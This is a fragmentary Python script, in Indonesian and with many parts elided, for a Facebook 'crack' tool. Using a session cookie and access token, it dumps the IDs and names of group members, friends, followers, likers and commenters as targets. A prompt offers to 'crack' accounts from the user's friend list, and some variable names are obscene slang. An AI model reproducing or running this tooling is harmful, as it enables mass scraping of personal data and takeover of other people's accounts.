...
import requests as r, re, sys, json, random
...
class Dump:
    ...
    def dump_grup(self, kueh, tok):
        try:
            ...
            a = r.get(f"https://graph.facebook.com/group/?id={kontol}&access_token={tok}").json()["name"]
...
[{merah}!{hapus}] untuk berhenti tekan CTRL lalu tekan c di keyboard anda."""))
    ...
    def crack_grup(self, url, cok):
        try:
            sop_dev = par(r.get(url, cookies=cok).content, "html.parser")
...
[{biru_m}*{hapus}] Ketik 'me' jika ingin crack dari daftar teman anda."""))
            ...
            tol = r.Session().get('https://graph.facebook.com/%s?fields=friends.limit(1000)&access_token=%s'%(uid.get("uid"),tok),cookies=cok)
    ...
    def dump_prem(self, cok, tok):
        try:
            ...
            tol = r.Session().get('https://graph.facebook.com/%s?fields=friends.limit(5000)&access_token=%s'%(uid.get("uid"),tok),cookies=cok)
            zzz = json.loads(tol.text)
            for x in zzz["friends"]["data"]:
                self.id.append(x["id"]+"<=>"+x["name"]+"\n")
        except KeyError:
    ...
    def followers(self, cok, tok):
        try:
            ...
            tol = r.Session().get('https://graph.facebook.com/%s?fields=subscribers.limit(5000000)&access_token=%s'%(uid.get("uid"),tok),cookies=cok)
            zzz = json.loads(tol.text)
    ...
    def dump_like(self, link, cok):
        try:
            xnxx = r.get(link,cookies=cok).text
            if "semua 0" in xnxx:
    ...
    def ngomen_post(self, link, coki):
        try:
            kontol= r.get(link,cookies=coki,headers={"user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}).text.encode("utf-8")
